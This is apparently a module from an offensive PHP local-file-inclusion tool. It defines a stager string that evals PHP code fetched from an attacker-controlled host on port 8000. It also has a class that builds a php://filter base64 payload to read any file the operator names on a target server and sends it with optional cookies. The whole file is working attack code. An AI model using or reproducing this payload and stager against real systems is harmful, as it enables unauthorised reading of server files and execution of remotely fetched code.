#!/usr/bin/env python3

from .utils import attack, colors, cook

STAGER = "<?php eval(file_get_contents('http://{0}:8000/{1}.php'))?>"

class Filter:
    def __init__(self, target, cookies):

        self.target = target
        self.cookies = cookies

    def execute_filter(self):
        """ Build payload """

        f_file = input(colors("[?] Please Enter File To Read: ", 94))
        payload = "php://filter/convert.base64-encode/resource={0}".format(f_file)

        if self.cookies:
            cookies = cook(self.cookies)
            attack(self.target, payload, cookies=cookies)
        else:
            attack(self.target, payload)
